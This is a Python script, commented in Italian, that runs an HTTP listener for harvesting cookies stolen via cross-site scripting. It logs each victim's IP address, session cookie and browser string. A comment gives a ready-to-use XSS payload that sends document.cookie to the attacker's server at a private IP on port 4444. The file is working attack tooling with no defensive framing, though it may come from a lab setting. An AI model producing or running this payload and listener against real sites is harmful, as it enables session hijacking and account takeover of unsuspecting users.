import http.server
import socketserver
import urllib.parse
from datetime import datetime
import threading

# Configurazione del Listener
PORTA = 4444
HOST = "0.0.0.0" # Ascolta su tutte le interfacce

class XSSRequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Gestore personalizzato per le richieste HTTP.
    Intercetta le richieste GET provenienti dal payload XSS.
    """
    
    # Sovrascrive il metodo di base per gestire le richieste GET
    def do_GET(self):
        
        # 1. Parsing dell'URL per estrarre i dati
        # self.path è l'URL completo (es. /?c=PHPSESSID=...)
        url_parti = urllib.parse.urlparse(self.path)
        # Estrae i parametri di query (es. c=...)
        query_params = urllib.parse.parse_qs(url_parti.query)
        
        # 2. Estrazione dei dati richiesti:
        # L'attaccante deve usare il parametro 'c' per i cookie nel payload JS.
        # Es: <script>new Image().src="http://192.168.104.100:4444/?c="+document.cookie;</script>
        
        # Estrae il valore del parametro 'c' (i cookie) o usa 'N/A' se non trovato
        cookie_ricevuto = query_params.get('c', ['N/A'])[0]
        
        # 3. Log di dati contestuali dal server:
        # Recupera l'IP della vittima
        ip_vittima = self.client_address[0]
        # Recupera l'User-Agent (Versione Browser) dalle intestazioni HTTP
        browser_info = self.headers.get('User-Agent', 'Sconosciuto')
        # Timestamp della ricezione
        data_invio = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # 4. Preparazione e Stampa del Log a Console
        
        separatore = "=" * 90
        
        intestazione = f"\n{separatore}\n"
        intestazione += f"| ORA RICEZIONE | IP VITTIMA | COOKIE | VERSIONE BROWSER (User-Agent)\n"
        intestazione += f"{separatore}\n"
        
        riga_dati = f"| {data_invio} | {ip_vittima} | {cookie_ricevuto} | {browser_info}"
        
        print("\n\n" + separatore)
        print(" NUOVO LOG XSS RICEVUTO ")
        print(intestazione, end="")
        print(riga_dati)
        print(separatore + "\n")
        
        # 5. Imposta la Risposta HTTP per il Browser
        # Risponde 200 OK e chiude la connessione (il browser stava solo cercando un'immagine)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        # Impedisce al browser di conservare la risposta in cache
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate') 
        self.end_headers()
        
        # Messaggio di risposta banale
        self.wfile.write(b"Logged.")


# Blocco principale per avviare il server
if __name__ == '__main__':
    # Creazione del server
    httpd = socketserver.TCPServer((HOST, PORTA), XSSRequestHandler)
    
    print(f"============================================================")
    print(f"   Server XSS Listener in ascolto su http://{HOST}:{PORTA} ")
    print(f"============================================================")
    print("  Attendi che la vittima visualizzi il payload...")
    print("  Premi CTRL+C per interrompere.")

    try:
        # Avvio del server
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n Server interrotto dall'utente.")
        httpd.shutdown()
    except Exception as e:
        print(f" Errore durante l'avvio o l'esecuzione del server: {e}")